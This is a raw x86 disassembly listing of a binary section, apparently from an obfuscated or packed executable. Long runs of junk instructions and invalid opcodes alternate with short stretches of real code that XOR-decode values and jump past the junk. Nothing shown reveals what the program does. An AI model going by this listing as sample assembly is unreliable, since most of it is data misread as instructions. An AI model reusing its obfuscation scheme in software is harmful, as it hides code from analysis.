  4065b1:	cli    
  4065b2:	jp     0x40660e
  4065b4:	mov    ah,0x67
  4065b6:	xchg   esp,eax
  4065b7:	jmp    0x4065be
  4065b9:	into   
  4065ba:	ror    ebp,cl
  4065bc:	lds    ebp,FWORD PTR ds:0xba2ad298
  4065c2:	(bad)  
  4065c4:	xchg   edx,eax
  4065c5:	int3   
  4065c6:	and    dl,BYTE PTR [edi-0x71e0cc56]
  4065cc:	pushf  
  4065cd:	mov    dh,0xdb
  4065cf:	mov    eax,0x1355df78
  4065d4:	mov    ds:0xa63141f3,al
  4065d9:	loop   0x40655f
  4065db:	cmp    esi,esp
  4065dd:	shld   esi,edx,cl
  4065e0:	(bad)  
  4065e1:	imul   al
  4065e3:	jns    0x406623
  4065e5:	adc    DWORD PTR [eax],0xffffffed
  4065e8:	xchg   edx,eax
  4065e9:	popf   
  4065ea:	adc    DWORD PTR [ecx+ecx*2-0x597f7a62],esi
  4065f1:	(bad)  
  4065f3:	mov    eax,0x38baae36
  4065f8:	mov    al,ds:0xa3bb69b3
  4065fd:	pop    edx
  4065fe:	std    
  4065ff:	inc    edx
  406600:	jg     0x406658
  406602:	cmp    eax,0x9b3b8209
  406607:	std    
  406608:	aaa    
  406609:	cmp    BYTE PTR [esi+0x27],bh
  40660c:	and    BYTE PTR [edx-0x31],ch
  40660f:	dec    edi
  406610:	xor    edx,0xffffffe9
  406613:	mov    BYTE PTR [eax+0x25514c19],ch
  406619:	mov    bl,0x1e
  40661b:	call   0xf51b:0x72dc2a55
  406622:	hlt    
  406623:	inc    esp
  406624:	jecxz  0x40666d
  406626:	jbe    0x406630
  406628:	ins    BYTE PTR es:[edi],dx
  406629:	out    dx,al
  40662a:	jbe    0x4065dc
  40662c:	leave  
  40662d:	mov    ah,0x1f
  40662f:	out    dx,al
  406630:	push   esp
  406631:	push   edi
  406632:	retf   
  406633:	jecxz  0x4065e5
  406635:	arpl   bp,di
  406637:	push   edx
  406638:	xchg   edx,eax
  406639:	mov    ds:0x4066e98,al
  40663e:	aaa    
  40663f:	lea    eax,[edi-0x11100e66]
  406645:	jecxz  0x406660
  406647:	mov    edi,0xcfdca9b7
  40664c:	fcom   st(6)
  40664e:	and    ebp,0xffffffc9
  406651:	frstor [edx-0x43]
  406654:	(bad)  
  406655:	pop    ebx
  406656:	cdq    
  406657:	in     al,0x10
  406659:	mov    esp,0xe87c6ef4
  40665e:	aad    0xcd
  406660:	xor    esp,edx
  406662:	imul   esp,DWORD PTR [ecx],0x88ad4fb5
  406668:	sti    
  406669:	(bad)  
  40666a:	cs in  al,dx
  40666c:	mov    ds:0x726ce59d,eax
  406671:	jp     0x40661b
  406673:	std    
  406674:	push   0xfe7a02e3
  406679:	je     0x406667
  40667b:	cld    
  40667c:	jmp    0x50390c2
  406681:	inc    edx
  406682:	aam    0x63
  406684:	push   edx
  406685:	mov    DWORD PTR [edi],edx
  406687:	cdq    
  406688:	repnz xchg ebp,eax
  40668a:	stos   BYTE PTR es:[edi],al
  40668b:	inc    ebp
  40668c:	and    DWORD PTR [ecx],ecx
  40668e:	pop    esp
  40668f:	dec    ebx
  406690:	ins    BYTE PTR es:[edi],dx
  406691:	xchg   esi,eax
  406692:	sbb    ah,BYTE PTR [edi+0x4f]
  406695:	mov    esi,0x946c0b5f
  40669a:	adc    BYTE PTR [ebx+eax*1+0x1f],bl
  40669e:	sbb    esp,DWORD PTR [edx]
  4066a0:	(bad)  
  4066a1:	std    
  4066a2:	mov    dh,0x22
  4066a4:	or     dl,BYTE PTR [eax+0x38]
  4066a7:	fist   WORD PTR ds:0xa5920322
  4066ad:	dec    edi
  4066ae:	shr    BYTE PTR [ebp-0x56b148ce],0x9a
  4066b5:	sbb    esp,DWORD PTR [edi+0x6a]
  4066b8:	xor    BYTE PTR [ecx+edi*2],dh
  4066bb:	add    eax,0xaa
  4066c0:	push   eax
  4066c1:	jmp    0x4067ed
  4066c6:	sub    ecx,DWORD PTR [esi+ecx*8-0xc]
  4066ca:	jge    0x4066c2
  4066cc:	jge    0x406731
  4066ce:	fnstenv [edi+0xd314a70]
  4066d4:	bound  ecx,QWORD PTR [ebx+edi*2+0x27]
  4066d8:	jl     0x406756
  4066da:	or     eax,0x647c7c7f
  4066df:	mov    BYTE PTR [edi+0x3563dcd6],dl
  4066e5:	shl    BYTE PTR [ecx],0x44
  4066e8:	jmp    0x40670c
  4066ea:	dec    esp
  4066eb:	cmp    edi,DWORD PTR [ebx-0x7add81d]
  4066f1:	pop    ds
  4066f2:	(bad)  
  4066f3:	icebp  
  4066f4:	mov    bl,0xf5
  4066f6:	jle    0x4066ad
  4066f8:	xchg   DWORD PTR ds:0x160fa84f,esi
  4066fe:	mov    bl,BYTE PTR [edi+0x43]
  406701:	cs inc eax
  406703:	aam    0x26
  406705:	push   ebx
  406706:	pop    ebx
  406707:	cdq    
  406708:	dec    ebx
  406709:	data16 or BYTE PTR [eax-0x72c72549],al
  406710:	mov    al,0x79
  406712:	call   0x84c5673d
  406717:	loopne 0x406712
  406719:	add    dl,BYTE PTR [edi+0x7a]
  40671c:	jl     0x406715
  40671e:	jmp    0x406747
  406720:	jg     0x4066f8
  406722:	pop    ebx
  406723:	cld    
  406724:	adc    DWORD PTR [esp+eax*2+0x149e494],esi
  40672b:	pop    DWORD PTR [ebp-0x69a63121]
  406731:	sub    BYTE PTR [ebx],bh
  406733:	(bad)  
  406734:	mov    al,ds:0xc3039d85
  406739:	and    ebx,DWORD PTR [esi]
  40673b:	mov    DWORD PTR [esi-0x58],esi
  40673e:	or     ebx,edx
  406740:	mov    dh,0xad
  406742:	test   al,0x8
  406744:	or     eax,0xc11fc51d
  406749:	shl    DWORD PTR [edi+0x45],1
  40674c:	sbb    BYTE PTR [ebp+0x1e5ac39],ch
  406752:	mov    al,ds:0x10fc7578
  406757:	jns    0x40678e
  406759:	xlat   BYTE PTR ds:[ebx]
  40675a:	retf   0x1477
  40675d:	cmp    ch,BYTE PTR [edx]
  40675f:	arpl   WORD PTR [ebp+0x7f48bdad],ax
  406765:	arpl   WORD PTR [esi+0x8],sp
  406768:	pop    ebp
  406769:	adc    bh,al
  40676b:	jno    0x4067cc
  40676d:	inc    esi
  40676e:	dec    ebp
  40676f:	mov    bh,0xa4
  406771:	popf   
  406772:	xor    eax,0x7ff8ff59
  406777:	pop    ebp
  406778:	lahf   
  406779:	psllq  mm0,mm1
  40677c:	push   ds
  40677d:	aad    0x9d
  40677f:	inc    ebp
  406780:	cli    
  406781:	add    eax,0x708974b6
  406786:	mov    fs,edi
  406788:	es popa 
  40678a:	pushf  
  40678b:	es mov ecx,0x2a16f52c
  406791:	jmp    0x4067be
  406793:	pushf  
  406794:	sbb    DWORD PTR ds:0xa6e16dc2,esi
  40679a:	ss (bad) 
  40679c:	xor    al,0xdd
  40679e:	push   ebx
  40679f:	dec    ebx
  4067a0:	sbb    BYTE PTR [ecx+esi*2-0x73],al
  4067a4:	mov    ecx,0xc3548b48
  4067a9:	cs es or eax,0xa5b16d12
  4067b0:	imul   edi,DWORD PTR [edi+0x2f],0xffffffdb
  4067b4:	jmp    0x40674d
  4067b6:	fimul  DWORD PTR [esi]
  4067b8:	mov    al,0x4e
  4067ba:	adc    al,0x92
  4067bc:	sbb    esp,edi
  4067be:	pop    ebp
  4067bf:	loopne 0x4067c3
  4067c1:	xchg   edx,eax
  4067c2:	aas    
  4067c3:	lods   eax,DWORD PTR ds:[esi]
  4067c4:	mov    eax,0xfee1d2ad
  4067c9:	(bad)  
  4067ca:	fmul   QWORD PTR [edx+0xd]
  4067cd:	jb     0x406811
  4067cf:	add    al,0x6e
  4067d1:	cmp    ebp,DWORD PTR [ecx-0x5b]
  4067d4:	mov    bl,0x58
  4067d6:	mov    eax,0x9b93f9e7
  4067db:	cmc    
  4067dc:	mov    dl,0x4
  4067de:	or     al,0xfb
  4067e0:	mov    bl,0x9
  4067e2:	loope  0x40678d
  4067e4:	cwde   
  4067e5:	or     BYTE PTR [edi],bl
  4067e7:	jnp    0x4067c8
  4067e9:	and    eax,0x8b02ba0e
  4067ee:	inc    ebp
  4067ef:	lock mov eax,DWORD PTR [eax+0x198]
  4067f6:	jmp    0x406922
  4067fb:	shr    ecx,cl
  4067fd:	dec    esp
  4067fe:	pop    esi
  4067ff:	pop    edx
  406800:	jns    0x4067e7
  406802:	ins    DWORD PTR es:[edi],dx
  406803:	adc    eax,0xaa54fb4
  406808:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406809:	and    dl,BYTE PTR [esi+0x8]
  40680c:	cmp    DWORD PTR [esp+edi*2+0xd],edi
  406810:	jg     0x40688e
  406812:	jl     0x406890
  406814:	je     0x406873
  406816:	jnp    0x406839
  406818:	adc    al,0x8b
  40681a:	jne    0x4067d6
  40681c:	or     al,0xce
  40681e:	int3   
  40681f:	fld    QWORD PTR [ecx+0x75b35f10]
  406825:	add    al,0x8b
  406827:	or     ah,dl
  406829:	popf   
  40682a:	(bad)  
  40682b:	arpl   WORD PTR [ecx],si
  40682d:	cmc    
  40682e:	retf   
  40682f:	imul   ebx,DWORD PTR [ebp-0x7048412a],0xffffffa7
  406836:	fst    st(0)
  406838:	ds add al,0xdb
  40683b:	test   DWORD PTR [esi+0x53b7b2ce],edi
  406841:	or     BYTE PTR [ebx-0x79e00d7e],dh
  406847:	(bad)  
  406849:	pop    ebp
  40684a:	inc    edi
  40684b:	sub    esi,ebp
  40684d:	cmp    al,0x59
  40684f:	add    BYTE PTR [edi],al
  406851:	fsub   st(6),st
  406853:	int    0x81
  406855:	fcom   QWORD PTR [eax+0x4c]
  406858:	mov    edi,0x9509034c
  40685d:	aaa    
  40685e:	dec    esi
  40685f:	lock stos BYTE PTR es:[edi],al
  406861:	popa   
  406862:	pop    esi
  406863:	inc    ebx
  406864:	aad    0xb2
  406866:	mov    ds,WORD PTR [edi-0x6da48173]
  40686c:	push   ecx
  40686d:	cdq    
  40686e:	shl    bl,cl
  406870:	int    0x36
  406872:	pop    ss
  406873:	and    eax,0x51dbdc14
  406878:	add    BYTE PTR [eax+eax*8],ch
  40687b:	inc    ebx
  40687c:	es push edx
  40687e:	or     ch,dl
  406880:	js     0x40682d
  406882:	push   es
  406883:	test   eax,0x765345d4
  406888:	(bad)  
  406889:	out    0xc4,eax
  40688b:	mov    eax,0x706e9c4c
  406890:	adc    al,0x29
  406892:	fidivr WORD PTR [edi+0x7c8ee19f]
  406898:	dec    ebx
  406899:	je     0x406838
  40689b:	and    esp,DWORD PTR [esi]
  40689d:	nop
  40689e:	jecxz  0x4068e1
  4068a0:	pushf  
  4068a1:	add    dh,cl
  4068a3:	mov    ebp,0x67083dc4
  4068a8:	push   ecx
  4068a9:	jmp    0xfe71:0x4ed33d44
  4068b0:	fs ret 0x3319
  4068b4:	xchg   edi,eax
  4068b5:	cmc    
  4068b6:	adc    ah,BYTE PTR [edi-0x16d421f]
  4068bc:	and    BYTE PTR [ebx],ch
  4068be:	bound  esi,QWORD PTR [ebp+ebx*2+0x6952a107]
  4068c5:	xchg   ebx,eax
  4068c6:	gs mov dh,0x7
  4068c9:	div    DWORD PTR [edx+0x52]
  4068cc:	adc    BYTE PTR [ebx-0x209a3ad2],dl
  4068d2:	stos   BYTE PTR es:[edi],al
  4068d3:	xchg   DWORD PTR [edx+0x38d63b18],ecx
  4068d9:	adc    al,0xfe
  4068db:	inc    ebp
  4068dc:	jmp    0x4068d9
  4068de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068df:	fwait
  4068e0:	jmp    0xd91e075c
  4068e5:	sbb    BYTE PTR [ebx],cl
  4068e7:	sub    ah,BYTE PTR [edi-0x1d]
  4068ea:	inc    ebx
  4068eb:	call   0xd152b1
  4068f0:	or     BYTE PTR [edx-0x38a968e8],0x9d
  4068f7:	add    ecx,DWORD PTR [esi-0x28a777f1]
  4068fd:	add    DWORD PTR [edx],0x8cd98c20
  406903:	xor    DWORD PTR [eax-0x771d2634],0x993f7bdc
  40690d:	fisub  DWORD PTR [esi]
  40690f:	adc    BYTE PTR [ecx],dh
  406911:	pop    ebx
  406912:	in     al,0x0
  406914:	(bad)  
  406915:	rcr    DWORD PTR [esi-0x2c0c5f9f],cl
  40691b:	ret    0xda19
  40691e:	xlat   BYTE PTR es:[ebx]
  406920:	push   es
  406921:	xchg   esi,eax
  406922:	push   DWORD PTR [eax]
  406924:	call   0x40101c
  406929:	mov    DWORD PTR [ebp-0x8],eax
  40692c:	cmp    DWORD PTR [ebp-0x8],0x0
  406930:	lea    eax,[ebp+0x4]
  406933:	mov    DWORD PTR [ebp-0x20],eax
  406936:	je     0x406fd6
  40693c:	lea    eax,[ebp-0x18]
  40693f:	push   eax
  406940:	mov    eax,DWORD PTR [ebp-0x2c]
  406943:	xor    eax,esi
  406945:	add    eax,edi
  406947:	push   eax
  406948:	mov    eax,DWORD PTR [ebp-0x1c]
  40694b:	xor    eax,esi
  40694d:	add    eax,edi
  40694f:	push   eax
  406950:	push   DWORD PTR [ebp-0x8]
  406953:	lea    eax,[ebp-0x78]
  406956:	push   eax
  406957:	push   DWORD PTR [ebp-0xc]
  40695a:	push   DWORD PTR [ebp-0x14]
  40695d:	call   0x4055ae
  406962:	test   eax,eax
  406964:	je     0x406abb
  40696a:	lea    eax,[ebp-0x78]
  40696d:	push   eax
  40696e:	mov    eax,DWORD PTR [ebp-0x14]
  406971:	xor    eax,esi
  406973:	add    eax,edi
  406975:	push   eax
  406976:	mov    eax,DWORD PTR [ebp-0x10]
  406979:	add    eax,0xee
  40697e:	push   eax
  40697f:	mov    eax,DWORD PTR [ebp-0x10]
  406982:	mov    eax,DWORD PTR [eax+0x198]
  406988:	push   DWORD PTR [eax]
  40698a:	jmp    0x406ab6
  40698f:	xor    BYTE PTR [ecx-0x12922c70],ch
  406995:	mov    bl,0xa9
  406997:	and    BYTE PTR [esi+eax*2-0x22],ch
  40699b:	out    dx,eax
  40699c:	jno    0x406960
  40699e:	sbb    DWORD PTR cs:[eax],edi
  4069a1:	jl     0x406a1f
  4069a3:	or     eax,0x847c7c7f
  4069a8:	xor    al,0xc0
  4069aa:	into   
  4069ab:	test   al,0x1c
  4069ad:	inc    eax
  4069ae:	cmc    
  4069af:	add    ah,BYTE PTR [ecx]
  4069b1:	outs   dx,DWORD PTR ds:[esi]
  4069b2:	ja     0x4069b6
  4069b4:	adc    BYTE PTR [edi],0xd
  4069b7:	pop    es
  4069b8:	or     eax,edx
  4069ba:	fs ror dh,cl
  4069bd:	mov    dl,0xcc
  4069bf:	mov    ah,0x60
  4069c1:	adc    esi,esi
  4069c3:	sbb    edx,DWORD PTR [edi]
  4069c5:	out    0x76,eax
  4069c7:	iret   
  4069c8:	sbb    DWORD PTR [edx],ebp
  4069ca:	mov    ch,0x8b
  4069cc:	lods   al,BYTE PTR ds:[esi]
  4069cd:	sub    al,0xb7
  4069cf:	pop    es
  4069d0:	mov    WORD PTR [ebx+0x453f55f5],?
  4069d6:	imul   edx,DWORD PTR [esi],0xffffffc4
  4069d9:	je     0x4069f8
  4069db:	fcomp  QWORD PTR [edx-0x7a]
  4069de:	sub    BYTE PTR [ecx],dl
  4069e0:	loop   0x406a51
  4069e2:	loope  0x406979
  4069e4:	je     0x406986
  4069e6:	adc    esp,esp
  4069e8:	add    BYTE PTR ds:0xb8172342,ch
  4069ee:	jl     0x406a18
  4069f0:	add    DWORD PTR [edi-0xaf946d2],ecx
  4069f6:	push   0xffffff8c
  4069f8:	leave  
  4069f9:	push   esi
  4069fa:	std    
  4069fb:	push   ecx
  4069fc:	sub    cl,BYTE PTR [edx]
  4069fe:	pop    ebp
  4069ff:	in     eax,0x67
  406a01:	aam    0x19
  406a03:	cli    
  406a04:	aas    
  406a05:	and    al,0xc
  406a07:	jmp    0xce34:0x1ffd26f7
  406a0e:	xchg   esi,eax
  406a0f:	sbb    BYTE PTR [ebp-0x1],al
  406a12:	scas   al,BYTE PTR es:[edi]
  406a13:	xor    eax,0xc006cf03
  406a18:	jno    0x406a0e
  406a1a:	pop    ebx
  406a1b:	retf   
  406a1c:	sub    al,0x91
  406a1e:	aaa    
  406a1f:	and    DWORD PTR fs:[ecx],0xfdf4dd40
  406a26:	jo     0x4069b3
  406a28:	std    
  406a29:	fsub   DWORD PTR [esi+0x23d5b8c4]
  406a2f:	jg     0x4069b3
  406a31:	out    dx,eax
  406a32:	fwait
  406a33:	rcr    DWORD PTR [ecx],cl
  406a35:	fldenv [edx*2-0x3907c237]
  406a3c:	inc    ebp
  406a3d:	out    dx,al
  406a3e:	cmc    
  406a3f:	or     eax,0xf310354e
  406a44:	cmp    eax,0xa53f63f4
  406a49:	adc    edi,DWORD PTR [esi]
  406a4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a4c:	xor    eax,0xdf541321
  406a51:	mov    ah,0x3d
  406a53:	(bad)  
  406a54:	scas   al,BYTE PTR es:[edi]
  406a55:	push   eax
  406a56:	arpl   WORD PTR [edi-0x14],sp
  406a59:	add    ah,dh
  406a5b:	test   eax,0x4f66af33
  406a60:	push   ecx
  406a61:	shl    BYTE PTR ds:[esi-0x17],0xb0
  406a66:	cmp    dl,ah
  406a68:	test   al,0xfb
  406a6a:	mov    ds:0xa5b81d2e,al
  406a6f:	mov    eax,edx
  406a71:	cld    
  406a72:	mov    ds:0xe9919bda,eax
  406a77:	push   ss
  406a78:	sub    ebx,DWORD PTR [edx+0x54]
  406a7b:	dec    esp
  406a7c:	mov    ecx,0x5fa05122
  406a81:	pop    esi
  406a82:	and    eax,0xa8945925
  406a87:	cmp    al,0xd
  406a89:	sahf   
  406a8a:	add    DWORD PTR [esp+ebp*8],ebp
  406a8d:	das    
  406a8e:	or     esp,edx
  406a90:	mov    ah,0xaf
  406a92:	cmp    bh,BYTE PTR [ebx+0x39]
  406a95:	xor    al,0xdc
  406a97:	mov    edi,0x7c1b487c
  406a9c:	xor    ecx,DWORD PTR [eax]
  406a9e:	mov    bh,0xb1
  406aa0:	xor    edi,DWORD PTR [ebp-0x76]
  406aa3:	rcr    BYTE PTR [ebx-0x18],1
  406aa6:	add    al,0xb
  406aa8:	push   edi
  406aa9:	aaa    
  406aaa:	mov    dl,0x25
  406aac:	ds mov al,0x65
  406aaf:	out    dx,eax
  406ab0:	(bad)  [edi+0x68b041e9]
  406ab6:	call   0x40101c
  406abb:	mov    ecx,DWORD PTR [ebp-0x1c]
  406abe:	xor    ecx,esi
  406ac0:	mov    eax,0xffcd8d62
  406ac5:	sub    eax,ecx
  406ac7:	jmp    0x406bf3
  406acc:	or     al,0x53
  406ace:	and    al,0x43
  406ad0:	jnp    0x406b2d
  406ad2:	jnp    0x406b27
  406ad4:	gs ins DWORD PTR es:[edi],dx
  406ad6:	push   esp
  406ad7:	and    dh,dl
  406ad9:	add    ebx,DWORD PTR [edi+0x7c3b1623]
  406adf:	jl     0x406aee
  406ae1:	jg     0x406b5f
  406ae3:	jl     0x406ae1
  406ae5:	mov    dl,0x6a
  406ae7:	pop    ebp
  406ae8:	jo     0x406aaf
  406aea:	mov    al,ds:0x667d4e43
  406aef:	dec    ebx
  406af0:	push   ebp
  406af1:	out    dx,al
  406af2:	(bad)  
  406af3:	aaa    
  406af4:	arpl   dx,di
  406af6:	inc    edi
  406af7:	or     esi,DWORD PTR [ecx-0x5fb121aa]
  406afd:	or     BYTE PTR [edi+0x4c444f97],bh
  406b03:	xor    eax,0xab0beab0
  406b08:	test   al,0xa2
  406b0a:	mov    bl,0xff
  406b0c:	ret    0x942e
  406b0f:	adc    al,0xd4
  406b11:	mov    eax,0x3c370580
  406b16:	adc    BYTE PTR [eax],ch
  406b18:	sub    BYTE PTR [eax+0x8],0xf2
  406b1c:	inc    ebx
  406b1d:	xchg   BYTE PTR [ecx+ebp*1-0x594c5f81],dh
  406b24:	mov    ch,0x33
  406b26:	push   ecx
  406b27:	xor    eax,0x2624ba47
  406b2c:	sbb    eax,0xa84eb801
  406b31:	add    dl,bh
  406b33:	ret    0x8fe4
  406b36:	ja     0x406b03
  406b38:	xchg   ecx,eax
  406b39:	std    
  406b3a:	push   0xd7e025ab
  406b3f:	enter  0xc58f,0xcf
  406b43:	cmp    DWORD PTR ds:0xfe2118ad,0x840d3f70
  406b4d:	fs into 
  406b4f:	pop    eax
  406b50:	leave  
  406b51:	cwde   
  406b52:	sub    ebx,DWORD PTR [ebx-0x60]
  406b55:	in     eax,0x0
  406b57:	clc    
  406b58:	stos   DWORD PTR es:[edi],eax
  406b59:	adc    eax,0x75fcad0
  406b5e:	daa    
  406b5f:	dec    ebx
  406b60:	das    
  406b61:	mov    ecx,0x6464e03c
  406b66:	retf   0x60ff
  406b69:	repnz popa 
  406b6b:	mov    ds:0x8e9442ae,eax
  406b70:	out    dx,al
  406b71:	mov    eax,ds:0xb5d965c4
  406b76:	loopne 0x406b03
  406b78:	pop    esp
  406b79:	adc    edx,DWORD PTR [edx+0x12042861]
  406b7f:	ror    DWORD PTR [eax+0x2a],0x79
  406b83:	nop
  406b84:	pop    esp
  406b85:	into   
  406b86:	fwait
  406b87:	sbb    eax,0x842ae4
  406b8c:	and    al,0x9a
  406b8e:	and    edi,DWORD PTR [eax-0x6dc0525e]
  406b94:	and    bl,BYTE PTR [ebx-0x3a]
  406b97:	jb     0x406b50
  406b99:	std    
  406b9a:	mov    bp,0x5c8c
  406b9e:	mov    ebx,0xa19c5fae
  406ba3:	lods   al,BYTE PTR ds:[esi]
  406ba4:	out    0x2e,al
  406ba6:	cli    
  406ba7:	shl    edx,cl
  406ba9:	scas   eax,DWORD PTR es:[edi]
  406baa:	nop
  406bab:	aaa    
  406bac:	push   ecx
  406bad:	jle    0x406bf7
  406baf:	iret   
  406bb0:	sbb    al,0xa0
  406bb2:	jle    0x406c11
  406bb4:	rcr    DWORD PTR [edx],0xdf
  406bb7:	cmp    BYTE PTR [esi-0x44],ch
  406bba:	xchg   DWORD PTR [ebx],ebx
  406bbc:	js     0x406c29
  406bbe:	mov    esp,0xa762a8ae
  406bc3:	sub    DWORD PTR [ecx-0x7b],ebp
  406bc6:	adc    DWORD PTR [edx+0x79],edx
  406bc9:	cmp    bl,BYTE PTR ds:0xe88479f9
  406bcf:	inc    DWORD PTR [ebp+0x38]
  406bd2:	(bad)  
  406bd3:	jae    0x406c06
  406bd5:	jle    0x406bb7
  406bd7:	mov    dh,BYTE PTR [esi]
  406bd9:	(bad)  
  406bda:	stos   DWORD PTR es:[edi],eax
  406bdb:	dec    eax
  406bdc:	sub    al,0xc4
  406bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bdf:	push   edi
  406be0:	stos   DWORD PTR es:[edi],eax
  406be1:	bound  esp,QWORD PTR ds:0x34127441
  406be7:	aaa    
  406be8:	xchg   esi,eax
  406be9:	jb     0x406c01
  406beb:	mov    bh,0xc9
  406bed:	and    eax,0x9502371
  406bf2:	sub    eax,DWORD PTR fs:[ebp-0x8]
  406bf6:	mov    ecx,DWORD PTR [ebp-0x30]
  406bf9:	add    ecx,eax
  406bfb:	jmp    0x406d27
  406c00:	xchg   ebp,eax
  406c01:	(bad)  
  406c02:	out    0x14,eax
  406c04:	std    
  406c05:	push   esp
  406c06:	gs popf 
  406c08:	repz mov al,ds:0xd5ea9e75
  406c0e:	je     0x406c47
  406c10:	daa    
  406c11:	cmp    bh,BYTE PTR [esp+edi*2+0xd]
  406c15:	jg     0x406c93
  406c17:	jl     0x406c8d
  406c19:	ficomp DWORD PTR [ecx+0xc]
  406c1c:	(bad)  
  406c1d:	cmp    eax,0x8f30558
  406c22:	lea    edi,[ebp-0x2a]
  406c25:	cmp    bh,BYTE PTR [eax-0x2bc1ecee]
  406c2b:	xor    DWORD PTR [edi+0x15],ebx
  406c2e:	test   DWORD PTR [eax+ebp*2-0x56bdd999],ecx
  406c35:	jmp    0xe63b2050
  406c3a:	mov    esi,ebp
  406c3c:	xlat   BYTE PTR ds:[ebx]
  406c3d:	(bad)  
  406c3e:	lea    eax,[ecx]
  406c40:	jns    0x406c34
  406c42:	loop   0x406bca
  406c44:	push   esi
  406c45:	repz add al,0x54
  406c48:	enter  0x542b,0x74
  406c4c:	sbb    DWORD PTR [ebx+eax*2-0x348e3941],ebx
  406c53:	jb     0x406c0f
  406c55:	mov    ch,0x3b
  406c57:	(bad)  
  406c58:	adc    DWORD PTR ds:0x85cead3d,eax
  406c5e:	jns    0x406be5
  406c60:	dec    edi
  406c61:	lahf   
  406c62:	adc    DWORD PTR [edx],esp
  406c64:	ins    DWORD PTR es:[edi],dx
  406c65:	arpl   WORD PTR [eax-0x65f9bdbb],bx
  406c6b:	jge    0x406c1d
  406c6d:	lea    edi,[eax]
  406c6f:	sbb    al,BYTE PTR [edi]
  406c71:	mov    dl,0xb1
  406c73:	pop    ebx
  406c74:	sub    al,BYTE PTR [ecx+0x11a829b4]
  406c7a:	xor    bh,dh
  406c7c:	mov    edi,esi
  406c7e:	sar    BYTE PTR [edi-0x6fe7bc75],0x9f
  406c85:	cmc    
  406c86:	lods   al,BYTE PTR ds:[esi]
  406c87:	pop    edx
  406c88:	mov    gs,WORD PTR [edi-0x721bfcf]
  406c8e:	aaa    
  406c8f:	loope  0x406c65
  406c91:	(bad)  
  406c92:	jmp    0xcb4c:0xd51022e0
  406c99:	(bad)  
  406c9a:	mov    ds:0xeb56ad9c,al
  406c9f:	and    sp,WORD PTR [eax-0x67]
  406ca3:	int    0x8f
  406ca5:	add    ecx,DWORD PTR [eax]
  406ca7:	hlt    
  406ca8:	pop    ss
  406ca9:	in     eax,0x34
  406cab:	inc    edi
  406cac:	inc    ebp
  406cad:	xor    BYTE PTR [ebx+0x6],al
  406cb0:	pop    es
  406cb1:	pusha  
  406cb2:	loopne 0x406d15
  406cb4:	mov    ebp,0xc3b50418
  406cb9:	push   ss
  406cba:	inc    ebx
  406cbb:	cwde   
  406cbc:	xchg   edi,eax
  406cbd:	push   ecx
  406cbe:	xor    BYTE PTR [ebx+0x23],ch
  406cc1:	out    0x9d,eax
  406cc3:	jle    0x406cef
  406cc5:	inc    esi
  406cc6:	pop    esp
  406cc7:	jne    0x406c49
  406cc9:	dec    eax
  406cca:	mov    al,ds:0x679f8b91
  406ccf:	and    BYTE PTR [ecx-0x15],cl
  406cd2:	inc    eax
  406cd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cd4:	sti    
  406cd5:	jge    0x406c94
  406cd7:	in     eax,0xe0
  406cd9:	pushf  
  406cda:	inc    ebx
  406cdb:	or     al,0x46
  406cdd:	test   BYTE PTR [edx+0x1a],bh
  406ce0:	dec    edx
  406ce1:	mov    edi,DWORD PTR [eax-0x7f756e5]
  406ce7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ce8:	call   0x61af201
  406ced:	fist   DWORD PTR ds:0x61e34317
  406cf3:	retf   0xffb5
  406cf6:	cli    
  406cf7:	mov    dl,BYTE PTR [edx+0xf]
  406cfa:	xchg   edi,eax
  406cfb:	mov    cl,0x50
  406cfd:	daa    
  406cfe:	cmp    ah,ch
  406d00:	pop    edi
  406d01:	out    0x8b,al
  406d03:	inc    esi
  406d04:	popa   
  406d05:	je     0x406d6d
  406d07:	out    dx,ax
  406d09:	fnstsw WORD PTR [edi+ecx*4-0x14]
  406d0d:	daa    
  406d0e:	addr16 mov ch,cl
  406d11:	gs int3 
  406d13:	pop    edx
  406d14:	mov    ah,0xd1
  406d16:	lea    esp,[ebx+0x58d8ba3d]
  406d1c:	mov    eax,ds:0x6f388eee
  406d21:	(bad)  
  406d22:	iret   
  406d23:	sbb    ebp,esi
  406d25:	xchg   edi,eax
  406d26:	jno    0x406cb3
  406d28:	inc    ebp
  406d29:	clc    
  406d2a:	mov    DWORD PTR [eax+0x1],ecx
  406d2d:	mov    al,BYTE PTR [ebp-0x1]
  406d30:	mov    ecx,DWORD PTR [ebp-0x8]
  406d33:	xor    al,0x49
  406d35:	sub    al,0x35
  406d37:	mov    BYTE PTR [ecx],al
  406d39:	lea    eax,[ebp-0x8]
  406d3c:	inc    BYTE PTR [eax]
  406d3e:	inc    eax
  406d3f:	push   eax
  406d40:	pop    ecx
  406d41:	dec    ecx
  406d42:	xchg   ecx,edx
  406d44:	dec    BYTE PTR [edx]
  406d46:	push   DWORD PTR [ebp-0x10]
  406d49:	mov    eax,ds:0x44425c
  406d4e:	mov    eax,DWORD PTR [eax]
  406d50:	push   DWORD PTR [eax]
  406d52:	lea    eax,ds:0x444278
  406d58:	jmp    0x406e84
  406d5d:	scas   eax,DWORD PTR es:[edi]
  406d5e:	stos   DWORD PTR es:[edi],eax
  406d5f:	fs pop ds
  406d61:	js     0x406d46
  406d63:	addr16 mov ebx,0xcd1c5374
  406d69:	stos   BYTE PTR es:[edi],al
  406d6a:	mov    edi,edx
  406d6c:	cmp    esi,DWORD PTR [edi*1+0x7f0d7c7c]
  406d73:	jl     0x406df1
  406d75:	rcr    ch,1
  406d77:	or     al,0xeb
  406d79:	cli    
  406d7a:	mov    ebp,0x23ed4cde
  406d7f:	or     esi,DWORD PTR [eax]
  406d81:	lods   eax,DWORD PTR ds:[esi]
  406d82:	adc    eax,0x43b6cf
  406d87:	mov    DWORD PTR [edx+0x59],ecx
  406d8a:	es inc edi
  406d8c:	scas   eax,DWORD PTR es:[edi]
  406d8d:	add    al,0x73
  406d8f:	out    0xa5,al
  406d91:	fcmovne st,st(1)
  406d93:	pushf  
  406d94:	sub    DWORD PTR [ecx+0x70],ecx
  406d97:	xchg   edi,eax
  406d98:	std    
  406d99:	test   BYTE PTR [ebp-0x43f9ea76],ah
  406d9f:	les    ebp,FWORD PTR [ebx]
  406da1:	mov    ch,0xa8
  406da3:	rcl    DWORD PTR [esi*1-0x41ca85],cl
  406daa:	push   ss
